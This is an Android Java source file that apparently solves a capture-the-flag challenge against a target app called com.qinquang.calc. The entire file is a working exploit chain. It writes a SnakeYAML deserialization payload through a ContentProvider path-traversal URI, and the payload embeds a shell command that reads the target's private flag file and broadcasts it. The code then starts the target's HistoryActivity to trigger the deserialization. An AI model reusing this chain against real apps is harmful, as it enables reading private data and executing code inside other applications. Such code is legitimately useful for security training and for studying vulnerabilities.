package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.yaml.snakeyaml.Yaml;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void triggerExploit() throws Exception {
        // Craft the YAML payload
        String command = "cat /data/data/com.qinquang.calc/flag-*.txt | xargs -I {} am broadcast -a com.qinquang.calc.FLAG --es flag {}";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";
        Log.d(TAG, "YAML Payload: " + yamlPayload);

        // Step 1: Write the YAML payload using ContentProvider path traversal
        try {
            // Use path traversal to write to history.yml
            Uri contentUri = Uri.parse("content://com.qinquang.calc/..%2f..%2ffiles%2fhistory.yml");
            Log.d(TAG, "Content URI: " + contentUri);
            
            // Try to write to the content provider
            Log.d(TAG, "Attempting to open output stream...");
            java.io.OutputStream outputStream = getContentResolver().openOutputStream(contentUri, "wt");
            if (outputStream != null) {
                Log.d(TAG, "Output stream opened successfully");
                byte[] bytes = yamlPayload.getBytes(StandardCharsets.UTF_8);
                Log.d(TAG, "Writing " + bytes.length + " bytes");
                outputStream.write(bytes);
                outputStream.flush();
                outputStream.close();
                Log.d(TAG, "Successfully wrote YAML payload to history.yml");
                Toast.makeText(this, "YAML written, triggering deserialization...", Toast.LENGTH_SHORT).show();
            } else {
                Log.e(TAG, "Failed to open output stream - returned null");
                Toast.makeText(this, "Failed to write YAML - stream is null", Toast.LENGTH_SHORT).show();
                return;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error writing YAML", e);
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            // Print stack trace
            e.printStackTrace();
            return;
        }

        // Step 2: Trigger YAML deserialization by opening HistoryActivity
        Log.d(TAG, "Waiting before triggering deserialization...");
        Thread.sleep(500);
        Log.d(TAG, "Starting HistoryActivity...");
        Intent historyIntent = new Intent();
        historyIntent.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.HistoryActivity"));
        historyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(historyIntent);
        
        Toast.makeText(this, "Deserialization triggered! Check logcat for flag.", Toast.LENGTH_SHORT).show();
        Log.d(TAG, "Exploit execution completed");
    }

    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // This is now primarily for local testing convenience, 
        // as the FlagReceiver handles the critical logging.
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
